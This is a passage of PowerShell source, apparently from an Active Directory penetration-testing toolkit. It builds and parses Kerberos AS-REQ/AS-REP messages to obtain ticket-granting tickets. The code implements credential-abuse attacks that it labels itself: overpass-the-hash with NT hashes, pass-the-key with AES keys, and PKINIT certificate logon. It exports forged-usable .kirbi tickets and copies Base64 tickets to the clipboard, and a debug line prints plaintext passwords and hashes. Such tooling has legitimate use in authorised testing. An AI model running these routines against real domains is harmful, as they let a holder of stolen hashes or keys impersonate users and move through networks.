	        $paEncTsEnc += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $pausec)
	        $paEncTsEncSeq = New-ASN1Sequence -Data $paEncTsEnc
	        $keyUsage = 1
	        switch ($EType) {
	            23 { $encrypted = Encrypt-RC4HMAC -Key $Key -Data $paEncTsEncSeq -KeyUsage $keyUsage }
	            17 { $encrypted = Encrypt-AESCTS -Key $Key -Data $paEncTsEncSeq -KeyUsage $keyUsage }
	            18 { $encrypted = Encrypt-AESCTS -Key $Key -Data $paEncTsEncSeq -KeyUsage $keyUsage }
	            default { throw "Unsupported encryption type: $EType" }
	        }
	        $encryptedData = New-KerberosEncryptedData -EType $EType -Cipher $encrypted
	        return $encryptedData
	    }
	    function New-KerberosASREQ {
	        param(
	            [string]$UserName,
	            [string]$Realm,
	            [byte[]]$Key,
	            [int]$EType,
	            [switch]$NoPAC,
	            [switch]$NoPreAuth  # Send AS-REQ without PA-ENC-TIMESTAMP to get PA-ETYPE-INFO2
	        )
	        $realmUpper = $Realm.ToUpper()
	        $nonce = [uint32](Get-Random -Minimum 1 -Maximum 2147483647)
	        $padataItems = @()
	        if (-not $NoPreAuth -and $Key) {
	            $paEncTs = New-PAEncTimestamp -Key $Key -EType $EType
	            $paPaEncTs = New-KerberosPAData -PADataType $Script:PA_ENC_TIMESTAMP -PADataValue $paEncTs
	            $padataItems += $paPaEncTs
	        }
	        $pacRequest = if ($NoPAC) {
	            New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $false))
	        } else {
	            New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $true))
	        }
	        $paPacReq = New-KerberosPAData -PADataType $Script:PA_PAC_REQUEST -PADataValue $pacRequest
	        $padataItems += $paPacReq
	        $padata = New-ASN1Sequence -Data $padataItems
	        $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -RenewableOK
	        $cname = New-KerberosPrincipalName -NameType $Script:NT_PRINCIPAL -NameStrings @($UserName)
	        $sname = New-KerberosPrincipalName -NameType $Script:NT_SRV_INST -NameStrings @("krbtgt", $realmUpper)
	        $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)
	        $etypeASN = New-ASN1Integer -Value $EType
	        $reqBodyContent = @()
	        $reqBodyContent += New-ASN1ContextTag -Tag 0 -Data $kdcOptions
	        $reqBodyContent += New-ASN1ContextTag -Tag 1 -Data $cname
	        $reqBodyContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $realmUpper)
	        $reqBodyContent += New-ASN1ContextTag -Tag 3 -Data $sname
	        $reqBodyContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)
	        $reqBodyContent += New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $nonce)
	        $reqBodyContent += New-ASN1ContextTag -Tag 8 -Data (New-ASN1Sequence -Data $etypeASN)
	        $reqBody = New-ASN1Sequence -Data $reqBodyContent
	        $kdcReqContent = @()
	        $kdcReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 5)
	        $kdcReqContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value $Script:KRB_AS_REQ)
	        $kdcReqContent += New-ASN1ContextTag -Tag 3 -Data $padata
	        $kdcReqContent += New-ASN1ContextTag -Tag 4 -Data $reqBody
	        $kdcReq = New-ASN1Sequence -Data $kdcReqContent
	        $asReq = New-ASN1ApplicationTag -Tag 10 -Data $kdcReq
	        return @{
	            ASReq = $asReq
	            Nonce = $nonce
	        }
	    }
	    function Parse-ASREP {
	        param([byte[]]$Data)
	        $result = @{
	            Success = $false
	            Error = $null
	            ErrorCode = $null  # KDC error code (integer) for structured error handling
	            ServerTime = $null # KDC server time from KRB-ERROR stime field
	            Ticket = $null
	            EncPart = $null
	            EType = $null
	            Kvno = $null
	            ETypeInfo2 = $null  # PA-ETYPE-INFO2 from e-data (contains salt for AES)
	        }
	        try {
	            $root = Read-ASN1Element -Data $Data -Offset 0
	            Write-Debug "[Parse-ASREP] Root tag: $($root.Tag) (masked: $($root.Tag -band 0x1F))"
	            if (($root.Tag -band 0x1F) -eq 30) {
	                Write-Debug "[Parse-ASREP] Detected KRB-ERROR response"
	                $sequenceElement = Read-ASN1Element -Data $root.Content -Offset 0
	                Write-Debug "[Parse-ASREP] Inner element tag: $($sequenceElement.Tag) (TagNumber: $($sequenceElement.TagNumber))"
	                $contentToParse = if ($sequenceElement.Tag -eq 0x30) {
	                    Write-Debug "[Parse-ASREP] Parsing inner SEQUENCE content"
	                    $sequenceElement.Content
	                } else {
	                    Write-Debug "[Parse-ASREP] Parsing APPLICATION content directly"
	                    $root.Content
	                }
	                $children = Read-ASN1Children -Data $contentToParse
	                $errorCode = $null
	                $errorText = $null
	                $edata = $null
	                $serverTime = $null
	                foreach ($child in $children) {
	                    Write-Debug "[Parse-ASREP] Processing child tag: $($child.Tag) (TagNumber: $($child.TagNumber))"
	                    if ($child.TagNumber -eq 4) {
	                        try {
	                            $stimeStr = Read-ASN1String -Content (Read-ASN1Element -Data $child.Content).Content
	                            $serverTime = [DateTime]::ParseExact($stimeStr, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                            Write-Debug "[Parse-ASREP] Server time (stime): $serverTime"
	                        } catch {
	                            Write-Debug "[Parse-ASREP] Failed to read stime: $_"
	                        }
	                    }
	                    elseif ($child.TagNumber -eq 6) {
	                        try {
	                            $innerElement = Read-ASN1Element -Data $child.Content
	                            $errorCode = Read-ASN1Integer -Content $innerElement.Content
	                            Write-Debug "[Parse-ASREP] Error code: $errorCode"
	                        } catch {
	                            Write-Debug "[Parse-ASREP] Failed to read error code: $_"
	                        }
	                    }
	                    elseif ($child.TagNumber -eq 11) {
	                        try {
	                            $errorText = Read-ASN1String -Content (Read-ASN1Element -Data $child.Content).Content
	                            Write-Debug "[Parse-ASREP] Error text: $errorText"
	                        } catch { }
	                    }
	                    elseif ($child.TagNumber -eq 12) {
	                        try {
	                            $edata = (Read-ASN1Element -Data $child.Content).Content
	                            Write-Debug "[Parse-ASREP] e-data present, length: $($edata.Length)"
	                        } catch { }
	                    }
	                }
	                $result.ErrorCode = $errorCode
	                $result.ServerTime = $serverTime
	                $result.Error = "KRB-ERROR"
	                if ($null -ne $errorCode) { $result.Error = "KRB-ERROR $errorCode" }
	                if ($errorText) { $result.Error += ": $errorText" }
	                if ($null -ne $errorCode) {
	                    $errorDesc = Get-KerberosErrorMessage -ErrorCode $errorCode
	                    $result.Error += " ($errorDesc)"
	                }
	                if ($errorCode -eq 37 -and $serverTime) {
	                    $localTimeUTC = [DateTime]::UtcNow
	                    $skew = $serverTime - $localTimeUTC
	                    $skewStr = if ($skew.TotalSeconds -ge 0) { "+$($skew.ToString('hh\:mm\:ss'))" } else { "-$(([Math]::Abs($skew.TotalSeconds) -as [TimeSpan]).ToString('hh\:mm\:ss'))" }
	                    $result.Error += " | DC time: $($serverTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC, Local: $($localTimeUTC.ToString('yyyy-MM-dd HH:mm:ss')) UTC, Offset: $skewStr"
	                }
	                if ($edata -and $errorCode -eq 25) {
	                    try {
	                        $edataElement = Read-ASN1Element -Data $edata -Offset 0
	                        Write-Debug "[Parse-ASREP] e-data element tag: $($edataElement.Tag), content length: $($edataElement.ContentLength)"
	                        $paDataSeq = Read-ASN1Children -Data $edataElement.Content
	                        Write-Debug "[Parse-ASREP] Parsing e-data: $($paDataSeq.Count) PA-DATA entries"
	                        foreach ($paItem in $paDataSeq) {
	                            Write-Debug "[Parse-ASREP] PA-DATA item tag: $($paItem.Tag)"
	                            $paChildren = Read-ASN1Children -Data $paItem.Content
	                            $paType = $null
	                            $paValue = $null
	                            foreach ($paChild in $paChildren) {
	                                Write-Debug "[Parse-ASREP] PA-DATA child tag: $($paChild.Tag), TagNumber: $($paChild.TagNumber)"
	                                if ($paChild.TagNumber -eq 1) {
	                                    $paTypeElement = Read-ASN1Element -Data $paChild.Content
	                                    $paType = Read-ASN1Integer -Content $paTypeElement.Content
	                                    Write-Debug "[Parse-ASREP] PA-DATA type: $paType"
	                                }
	                                elseif ($paChild.TagNumber -eq 2) {
	                                    $paValueElement = Read-ASN1Element -Data $paChild.Content
	                                    $paValue = $paValueElement.Content
	                                    Write-Debug "[Parse-ASREP] PA-DATA value length: $($paValue.Length)"
	                                }
	                            }
	                            if ($paType -eq 19 -and $paValue) {
	                                Write-Debug "[Parse-ASREP] Found PA-ETYPE-INFO2, parsing..."
	                                try {
	                                    $etypeInfo2Seq = Read-ASN1Element -Data $paValue -Offset 0
	                                    Write-Debug "[Parse-ASREP] ETYPE-INFO2 outer tag: $($etypeInfo2Seq.Tag)"
	                                    $etypeInfo2Entries = Read-ASN1Children -Data $etypeInfo2Seq.Content
	                                    foreach ($entry in $etypeInfo2Entries) {
	                                        Write-Debug "[Parse-ASREP] ETYPE-INFO2-ENTRY tag: $($entry.Tag)"
	                                        $entryChildren = Read-ASN1Children -Data $entry.Content
	                                        $entryEType = $null
	                                        $entrySalt = $null
	                                        foreach ($field in $entryChildren) {
	                                            Write-Debug "[Parse-ASREP] ETYPE-INFO2 field tag: $($field.Tag), TagNumber: $($field.TagNumber)"
	                                            if ($field.TagNumber -eq 0) {
	                                                $etypeElement = Read-ASN1Element -Data $field.Content
	                                                $entryEType = Read-ASN1Integer -Content $etypeElement.Content
	                                                Write-Debug "[Parse-ASREP] Parsed etype: $entryEType"
	                                            }
	                                            elseif ($field.TagNumber -eq 1) {
	                                                $saltElement = Read-ASN1Element -Data $field.Content
	                                                $entrySalt = Read-ASN1String -Content $saltElement.Content
	                                                Write-Debug "[Parse-ASREP] Parsed salt: $entrySalt"
	                                            }
	                                        }
	                                        Write-Debug "[Parse-ASREP] ETYPE-INFO2-ENTRY: etype=$entryEType, salt=$entrySalt"
	                                        if ($entrySalt -and -not $result.ETypeInfo2) {
	                                            $result.ETypeInfo2 = @{
	                                                EType = $entryEType
	                                                Salt = $entrySalt
	                                            }
	                                            Write-Debug "[Parse-ASREP] Using salt from PA-ETYPE-INFO2: $entrySalt"
	                                        }
	                                    }
	                                } catch {
	                                    Write-Debug "[Parse-ASREP] Failed to parse PA-ETYPE-INFO2: $_"
	                                }
	                            }
	                        }
	                    } catch {
	                        Write-Debug "[Parse-ASREP] Failed to parse e-data: $_"
	                    }
	                }
	                return $result
	            }
	            if (($root.Tag -band 0x1F) -ne 11) {
	                $result.Error = "Unexpected response type: $($root.Tag)"
	                return $result
	            }
	            $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
	            $children = Read-ASN1Children -Data $innerSeq.Content
	            foreach ($child in $children) {
	                switch ($child.TagNumber) {
	                    5 {
	                        $result.Ticket = $child.Content
	                    }
	                    6 {
	                        $encPartSeq = Read-ASN1Element -Data $child.Content
	                        $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content
	                        foreach ($encChild in $encPartChildren) {
	                            if ($encChild.TagNumber -eq 0) {
	                                $result.EType = Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content
	                            }
	                            elseif ($encChild.TagNumber -eq 1) {
	                                $result.Kvno = Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content
	                            }
	                            elseif ($encChild.TagNumber -eq 2) {
	                                $result.EncPart = (Read-ASN1Element -Data $encChild.Content).Content
	                            }
	                        }
	                    }
	                }
	            }
	            $result.Success = $true
	        }
	        catch {
	            $result.Error = "Failed to parse AS-REP: $_"
	        }
	        return $result
	    }
	    function Parse-EncASRepPart {
	        param(
	            [byte[]]$Data,
	            [byte[]]$Key,
	            [int]$EType
	        )
	        $keyUsage = 3
	        try {
	            switch ($EType) {
	                23 { $decrypted = Decrypt-RC4HMAC -Key $Key -CipherText $Data -KeyUsage $keyUsage }
	                17 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
	                18 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
	                default { throw "Unsupported encryption type: $EType" }
	            }
	        }
	        catch {
	            return @{ Success = $false; Error = "Decryption failed: $_" }
	        }
	        $result = @{
	            Success = $true
	            SessionKey = $null
	            SessionKeyType = $null
	            TicketFlags = $null
	            AuthTime = $null
	            StartTime = $null
	            EndTime = $null
	            RenewTill = $null
	        }
	        try {
	            $root = Read-ASN1Element -Data $decrypted
	            $contentToParse = $root.Content
	            if ($root.Tag -eq 0x30) {
	                $contentToParse = $root.Content
	            } else {
	                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
	                $contentToParse = $innerSeq.Content
	            }
	            $children = Read-ASN1Children -Data $contentToParse
	            foreach ($child in $children) {
	                switch ($child.TagNumber) {
	                    0 {
	                        $keySeq = Read-ASN1Element -Data $child.Content
	                        $keyChildren = Read-ASN1Children -Data $keySeq.Content
	                        foreach ($keyChild in $keyChildren) {
	                            if ($keyChild.TagNumber -eq 0) {
	                                $result.SessionKeyType = Read-ASN1Integer -Content (Read-ASN1Element -Data $keyChild.Content).Content
	                            }
	                            elseif ($keyChild.TagNumber -eq 1) {
	                                $result.SessionKey = (Read-ASN1Element -Data $keyChild.Content).Content
	                            }
	                        }
	                    }
	                    4 {
	                        $flagElement = Read-ASN1Element -Data $child.Content
	                        if ($flagElement.Content.Length -ge 5) {
	                            $result.TicketFlags = $flagElement.Content[1..4]
	                        } elseif ($flagElement.Content.Length -eq 4) {
	                            $result.TicketFlags = $flagElement.Content
	                        }
	                    }
	                    5 {
	                        $timeElement = Read-ASN1Element -Data $child.Content
	                        $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                        $result.AuthTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                    }
	                    6 {
	                        $timeElement = Read-ASN1Element -Data $child.Content
	                        $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                        $result.StartTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                    }
	                    7 {
	                        $timeElement = Read-ASN1Element -Data $child.Content
	                        $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                        $result.EndTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                    }
	                    8 {
	                        $timeElement = Read-ASN1Element -Data $child.Content
	                        $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                        $result.RenewTill = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                    }
	                }
	            }
	        }
	        catch {
	            $result.Success = $false
	            $result.Error = "Failed to parse EncASRepPart: $_"
	        }
	        return $result
	    }
	    function ConvertTo-KRBCredBase64 {
	        param(
	            [byte[]]$TicketBytes,
	            [byte[]]$SessionKeyBytes,
	            [int]$SessionKeyType,
	            [string]$Realm,
	            [string]$ClientName,
	            [byte[]]$TicketFlags,
	            $StartTime,
	            $EndTime,
	            $RenewTill
	        )
	        if (-not $TicketBytes -or $TicketBytes.Length -eq 0) {
	            Write-Warning "[ConvertTo-KRBCredBase64] TicketBytes is null or empty"
	            return $null
	        }
	        if (-not $SessionKeyBytes -or $SessionKeyBytes.Length -eq 0) {
	            Write-Warning "[ConvertTo-KRBCredBase64] SessionKeyBytes is null or empty - cannot create valid KRB-CRED"
	            return $null
	        }
	        $buildParams = @{
	            Ticket = $TicketBytes
	            SessionKey = $SessionKeyBytes
	            SessionKeyType = $SessionKeyType
	            Realm = $Realm
	            ClientName = $ClientName
	            ServerName = "krbtgt"
	            ServerInstance = $Realm
	            StartTime = $StartTime
	            EndTime = $EndTime
	            RenewTill = $RenewTill
	        }
	        if ($TicketFlags) { $buildParams['TicketFlags'] = $TicketFlags }
	        $krbCred = Build-KRBCred @buildParams
	        return [Convert]::ToBase64String($krbCred)
	    }
	    function Add-TicketHelperMethods {
	        param(
	            [Parameter(Mandatory=$true)]
	            [PSCustomObject]$ResultObject
	        )
	        $ResultObject | Add-Member -MemberType ScriptMethod -Name "CopyTicket" -Value {
	            if ($this.Ticket) {
	                $this.Ticket | Set-Clipboard
	                Write-Host "[+] Ticket copied to clipboard (Base64, single line)" -ForegroundColor Green
	            }
	        }
	        $ResultObject | Add-Member -MemberType ScriptMethod -Name "ShowTicket" -Value {
	            if ($this.Ticket) {
	                Write-Host "`n[Ticket Base64 - Single Line]" -ForegroundColor Cyan
	                Write-Host $this.Ticket -ForegroundColor White
	                Write-Host ""
	            }
	        }
	        return $ResultObject
	    }
	}
	process {
	    try {
	        $realmUpper = $Domain.ToUpper()
	        $AuthMethod = "Unknown"
	        switch ($AuthMethodType) {
	            { $_ -in @("Credential", "Password") } {
	                if ($AuthMethodType -eq "Credential") {
	                    $PlainPassword = $Credential.GetNetworkCredential().Password
	                    $AuthMethod = "Password (from Credential)"
	                } else {
	                    $PlainPassword = $Password
	                    $AuthMethod = "Password"
	                }
	                $EType = $PreferredEType
	                $Salt = $realmUpper + $UserName
	                switch ($EType) {
	                    18 {
	                        $KeyBytes = Get-AESKeyFromPassword -PlainPassword $PlainPassword -Salt $Salt -KeyLength 32
	                    }
	                    17 {
	                        $KeyBytes = Get-AESKeyFromPassword -PlainPassword $PlainPassword -Salt $Salt -KeyLength 16
	                    }
	                    default {
	                        $KeyBytes = Get-NTHashFromPassword -PlainPassword $PlainPassword
	                        $ntHashHex = ($KeyBytes | ForEach-Object { $_.ToString('X2') }) -join ''
	                        Write-Debug "[Invoke-KerberosAuth] Computed NT-Hash: $ntHashHex (from password: '$PlainPassword')"
	                    }
	                }
	            }
	            "NTHash" {
	                $EType = 23
	                $KeyBytes = [byte[]]@(for ($i = 0; $i -lt 32; $i += 2) { [Convert]::ToByte($NTHash.Substring($i, 2), 16) })
	                $AuthMethod = "Overpass-the-Hash (RC4-HMAC)"
	            }
	            "AES256Key" {
	                $EType = 18
	                $KeyBytes = [byte[]]@(for ($i = 0; $i -lt 64; $i += 2) { [Convert]::ToByte($AES256Key.Substring($i, 2), 16) })
	                $AuthMethod = "Pass-the-Key (AES256)"
	            }
	            "AES128Key" {
	                $EType = 17
	                $KeyBytes = [byte[]]@(for ($i = 0; $i -lt 32; $i += 2) { [Convert]::ToByte($AES128Key.Substring($i, 2), 16) })
	                $AuthMethod = "Pass-the-Key (AES128)"
	            }
	            "Certificate" {
	                $AuthMethod = "PKINIT (Certificate)"
	                $pkInitParams = @{
	                    Domain = $Domain
	                    DomainController = $DomainController
	                    UserName = $UserName
	                    NoPAC = $NoPAC
	                }
	                if ($Certificate -is [System.Security.Cryptography.X509Certificates.X509Certificate2]) {
	                    $pkInitParams['Certificate'] = $Certificate
	                    $AuthMethod = "PKINIT (Certificate Object)"
	                }
	                elseif ($Certificate -is [string]) {
	                    $certResult = ConvertFrom-Base64OrFile -InputValue $Certificate -ExpectedFormat "Certificate" -ParameterName "Certificate"
	                    if (-not $certResult.Success) {
	                        return [PSCustomObject]@{
	                            Success = $false
	                            Method = $AuthMethod
	                            UserName = $UserName
	                            Domain = $realmUpper
	                            DomainController = $DomainController
	                            Error = "Certificate error: $($certResult.Error)"
	                            ErrorCode = $null  # Certificate errors are not KDC errors
	                            Message = "Certificate error: $($certResult.Error)"
	                        }
	                    }
	                    try {
	                        $CertObject = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
	                            $certResult.Data,
	                            $CertificatePassword,
	                            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
	                        )
	                        $pkInitParams['Certificate'] = $CertObject
	                        $AuthMethod = "PKINIT (Certificate from $($certResult.Source))"
	                    }
	                    catch {
	                        return [PSCustomObject]@{
	                            Success = $false
	                            Method = $AuthMethod
	                            UserName = $UserName
	                            Domain = $realmUpper
	                            DomainController = $DomainController
	                            Error = "Failed to load certificate: $_"
	                            ErrorCode = $null  # Certificate errors are not KDC errors
	                            Message = "Failed to load certificate: $_"
	                        }
	                    }
	                }
	                else {
	                    return [PSCustomObject]@{
	                        Success = $false
	                        Method = $AuthMethod
	                        UserName = $UserName
	                        Domain = $realmUpper
	                        DomainController = $DomainController
	                        Error = "Invalid Certificate parameter type. Expected X509Certificate2, file path, or Base64 string."
	                        ErrorCode = $null  # Certificate errors are not KDC errors
	                        Message = "Invalid Certificate parameter type"
	                    }
	                }
	                if ($OutputKirbi) { $pkInitParams['OutputKirbi'] = $OutputKirbi }
	                $pkInitResult = Invoke-PKINITAuth-Native @pkInitParams
	                $pkInitClockSkew = $null
	                if ($pkInitResult.AuthTime) {
	                    $pkInitClockSkew = $pkInitResult.AuthTime - [DateTime]::UtcNow
	                }
	                $resultObj = [PSCustomObject]@{
	                    Success = $pkInitResult.Success
	                    Method = $AuthMethod
	                    UserName = $UserName
	                    Domain = $realmUpper
	                    DomainController = $DomainController
	                    EncryptionType = if ($pkInitResult.EncryptionType) { $pkInitResult.EncryptionType } else { "PKINIT-DH" }
	                    Ticket = $pkInitResult.Ticket
	                    SessionKey = $pkInitResult.SessionKey
	                    SessionKeyBytes = $pkInitResult.SessionKeyBytes
	                    TicketBytes = $pkInitResult.TicketBytes
	                    TicketFlags = $pkInitResult.TicketFlags
	                    ASRepReplyKey = $pkInitResult.ASRepReplyKey  # DH-derived key for UnPAC-the-hash
	                    AuthTime = $pkInitResult.AuthTime
	                    StartTime = $pkInitResult.StartTime
	                    EndTime = $pkInitResult.EndTime
	                    RenewTill = $pkInitResult.RenewTill
	                    ClockSkew = $pkInitClockSkew
	                    Message = if ($pkInitResult.Success) { "PKINIT authentication successful" } else { $pkInitResult.Error }
	                    Error = $pkInitResult.Error
	                }
	                if ($pkInitResult.Success -and $pkInitResult.Ticket) {
	                    $resultObj = Add-TicketHelperMethods -ResultObject $resultObj
	                }
	                if ($OutputTicketOnly) {
	                    if ($pkInitResult.Success -and $pkInitResult.TicketBytes -and $pkInitResult.SessionKeyBytes) {
	                        return ConvertTo-KRBCredBase64 -TicketBytes $pkInitResult.TicketBytes `
	                            -SessionKeyBytes $pkInitResult.SessionKeyBytes `
	                            -SessionKeyType $pkInitResult.EncryptionType `
	                            -Realm $realmUpper `
	                            -ClientName $UserName `
	                            -TicketFlags $pkInitResult.TicketFlags `
	                            -StartTime $pkInitResult.StartTime `
	                            -EndTime $pkInitResult.EndTime `
	                            -RenewTill $pkInitResult.RenewTill
	                    } else {
	                        Write-Error "PKINIT authentication failed: $($pkInitResult.Error)"
	                        return $null
	                    }
	                }
	                return $resultObj
	            }
	        }
	        $UseKDCSalt = ($AuthMethodType -in @("Credential", "Password")) -and ($EType -in @(17, 18))
	        if ($UseKDCSalt) {
	            $saltReqResult = New-KerberosASREQ -UserName $UserName -Realm $Domain -EType $EType -NoPreAuth
	            $saltReqBytes = $saltReqResult.ASReq
	            $saltResponseBytes = Send-KerberosRequest -Server $DomainController -Request $saltReqBytes
	            $saltResponse = Parse-ASREP -Data $saltResponseBytes
	            if ($saltResponse.ErrorCode -eq 25 -and $saltResponse.ETypeInfo2) {
	                $kdcSalt = $saltResponse.ETypeInfo2.Salt
	                if ($kdcSalt -and $kdcSalt -cne $Salt) {
	                    $Salt = $kdcSalt
	                    switch ($EType) {
	                        18 { $KeyBytes = Get-AESKeyFromPassword -PlainPassword $PlainPassword -Salt $Salt -KeyLength 32 }
	                        17 { $KeyBytes = Get-AESKeyFromPassword -PlainPassword $PlainPassword -Salt $Salt -KeyLength 16 }
	                    }
	                } else {
	                }
	            } elseif ($saltResponse.ErrorCode -eq 25) {
	            } else {
	            }
	        }
	        $asReqResult = New-KerberosASREQ -UserName $UserName -Realm $Domain -Key $KeyBytes -EType $EType -NoPAC:$NoPAC
	        $asReqBytes = $asReqResult.ASReq
	        $responseBytes = Send-KerberosRequest -Server $DomainController -Request $asReqBytes
	        $asRep = Parse-ASREP -Data $responseBytes
	        if (-not $asRep.Success) {
	            $clockSkew = $null
	            if ($asRep.ServerTime) {
	                $clockSkew = $asRep.ServerTime - [DateTime]::UtcNow
	            }
	            return [PSCustomObject]@{
	                Success = $false
	                Method = $AuthMethod
	                UserName = $UserName
	                Domain = $Domain
	                Error = $asRep.Error
	                ErrorCode = $asRep.ErrorCode  # KDC error code (e.g., 24=KDC_ERR_PREAUTH_FAILED)
	                ClockSkew = $clockSkew  # TimeSpan if server time available
	                Message = "$AuthMethod failed: $($asRep.Error)"
	            }
	        }
	        if ($asRep.EType -ne $EType) {
	        }
	        $keyHex = ($KeyBytes | ForEach-Object { $_.ToString('X2') }) -join ''
	        $encRepPart = Parse-EncASRepPart -Data $asRep.EncPart -Key $KeyBytes -EType $asRep.EType
	        if (-not $encRepPart.Success) {
	            return [PSCustomObject]@{
	                Success = $false
	                Method = $AuthMethod
	                UserName = $UserName
	                Domain = $realmUpper
	                DomainController = $DomainController
	                EncryptionType = $asRep.EType
	                Ticket = $null
	                SessionKey = $null
	                SessionKeyBytes = $null
	                TicketBytes = $null
	                Error = "Decryption failed: $($encRepPart.Error)"
	                ErrorCode = $null  # NOT a KDC error - allow fallback to NTLM/SimpleBind
	                Message = "$AuthMethod failed: Cannot decrypt AS-REP (try -ForceSimpleBind)"
	            }
	        } else {
	            $sessionKey = $encRepPart.SessionKey
	            if ($encRepPart.EndTime) {
	            }
	            if ($encRepPart.RenewTill) {
	            }
	        }
	        $ticketB64 = [Convert]::ToBase64String($asRep.Ticket)
	        $sessionKeyB64 = if ($sessionKey) { [Convert]::ToBase64String($sessionKey) } else { $null }
	        if ($OutputKirbi) {
	            if (-not $sessionKey) {
	                Write-Warning "[Invoke-KerberosAuth] Cannot save kirbi: Session key not available (decryption failed)"
	            } else {
	                $krbCredBytes = Build-KRBCred -Ticket $asRep.Ticket `
	                    -SessionKey $sessionKey `
	                    -SessionKeyType $asRep.EType `
	                    -Realm $realmUpper `
	                    -ClientName $UserName `
	                    -ServerName "krbtgt" `
	                    -ServerInstance $realmUpper `
	                    -StartTime $encRepPart.StartTime `
	                    -EndTime $encRepPart.EndTime `
	                    -RenewTill $encRepPart.RenewTill
	                $exportResult = Export-adPEASFile -Path $OutputKirbi -Content $krbCredBytes -Type Binary -Force
	                if ($exportResult.Success) {
	                } else {
	                    Write-Warning "[Invoke-KerberosAuth] Failed to save kirbi: $($exportResult.Message)"
	                }
	            }
	        }
	        $clockSkew = $null
	        if ($encRepPart.AuthTime) {
	            $clockSkew = $encRepPart.AuthTime - [DateTime]::UtcNow
	        }
	        $resultObj = [PSCustomObject]@{
	            Success = $true
	            Method = $AuthMethod
	            UserName = $UserName
	            Domain = $realmUpper
	            DomainController = $DomainController
	            EncryptionType = $asRep.EType
	            Ticket = $ticketB64
	            SessionKey = $sessionKeyB64
	            SessionKeyBytes = $sessionKey
	            TicketBytes = $asRep.Ticket
	            TicketFlags = $encRepPart.TicketFlags
	            AuthTime = $encRepPart.AuthTime
	            StartTime = $encRepPart.StartTime
	            EndTime = $encRepPart.EndTime
	            RenewTill = $encRepPart.RenewTill
	            ClockSkew = $clockSkew  # TimeSpan: KDC time minus local UTC time
	            Error = $null
	            ErrorCode = $null  # No error on success
	            Message = "$AuthMethod authentication successful"
	        }
	        $resultObj = Add-TicketHelperMethods -ResultObject $resultObj
	        if ($OutputTicketOnly) {
	            if (-not $sessionKey) {
	                Write-Error "Cannot create KRB-CRED: Session key not available (decryption failed)"
	                return $null
	            }
	            $krbCredB64 = ConvertTo-KRBCredBase64 -TicketBytes $asRep.Ticket `
	                -SessionKeyBytes $sessionKey `
	                -SessionKeyType $asRep.EType `
	                -Realm $realmUpper `
	                -ClientName $UserName `
	                -TicketFlags $encRepPart.TicketFlags `
	                -StartTime $encRepPart.StartTime `
	                -EndTime $encRepPart.EndTime `
	                -RenewTill $encRepPart.RenewTill
	            if (-not $krbCredB64) {
	                Write-Error "Failed to create KRB-CRED"
	                return $null
	            }
	            return $krbCredB64
	        }
	        return $resultObj
	    }
	    catch {
	        Write-Debug "[Invoke-KerberosAuth] Error details: $($_.Exception.ToString())"
	        $IsNetworkError = $false
	        $NetworkErrorServer = $null
	        $NetworkErrorPort = 88
	        $innerEx = $_.Exception
	        while ($innerEx) {
	            if ($innerEx -is [System.Net.Sockets.SocketException] -or
	                $innerEx.Message -match 'No connection could be made|actively refused|target machine|cannot be reached|network is unreachable|host is down|timed out') {
	                $IsNetworkError = $true
	                $NetworkErrorServer = $DomainController
	                break
	            }
	            $innerEx = $innerEx.InnerException
	        }
	        if ($OutputTicketOnly) {
	            Write-Error "$AuthMethod failed: $_"
	            return $null
	        }
	        return [PSCustomObject]@{
	            Success = $false
	            Method = $AuthMethod
	            UserName = $UserName
	            Domain = $Domain
	            Error = $_.Exception.Message
	            ErrorCode = $null  # Non-KDC errors don't have error codes
	            Message = "$AuthMethod failed: $_"
	            IsNetworkError = $IsNetworkError
	            NetworkErrorServer = $NetworkErrorServer
	            NetworkErrorPort = $NetworkErrorPort
	        }
	    }
	}
	end {
	}
}
function Request-ServiceTicket {
	[CmdletBinding(DefaultParameterSetName='Normal')]
	param(
	    [Parameter(Mandatory=$true)]
	    [ValidateScript({ $_.Length -gt 0 })]
	    [byte[]]$TGT,
	    [Parameter(Mandatory=$true)]
	    [ValidateScript({ $_.Length -gt 0 })]
